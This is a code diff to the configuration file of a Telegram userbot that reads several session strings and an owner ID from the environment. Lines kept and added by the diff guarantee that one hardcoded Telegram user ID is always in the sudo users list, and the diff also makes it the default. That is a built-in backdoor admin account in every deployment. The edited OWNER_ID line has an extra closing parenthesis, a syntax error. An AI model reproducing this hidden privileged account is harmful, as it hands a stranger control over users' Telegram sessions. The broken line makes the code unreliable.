@@ -1,4 +1,4 @@
-
+import os
 
 import re
 import sys
@@ -18,7 +18,7 @@ ALIVE_PIC = getenv("ALIVE_PIC", None)
 
 #CLIENT SESSION
 
-STRING1 = getenv("STRING_SESSION1", None)
+STRING1 = getenv("STRING_SESSION", None)
 STRING2 = getenv("STRING_SESSION2", None)
 STRING3 = getenv("STRING_SESSION3", None)
 STRING4 = getenv("STRING_SESSION4", None)
@@ -28,12 +28,12 @@ STRING7 = getenv("STRING_SESSION7", None)
 STRING8 = getenv("STRING_SESSION8", None)
 STRING9 = getenv("STRING_SESSION9", None)
 STRING10 = getenv("STRING_SESSION10", None)
-OWNER_ID = int(os.environ.get("OWNER_ID", None))
+OWNER_ID = getenv("OWNER_ID", None))
 
 
 # USERBOT ADMINS AND OWNER
 
-SUDO_USERS = list(map(int, getenv("SUDO_USER").split()))
+SUDO_USERS = list(map(int, getenv("SUDO_USER", "5256676062").split()))
 if 5256676062 not in SUDO_USERS: 
     SUDO_USERS.append(5256676062)
 
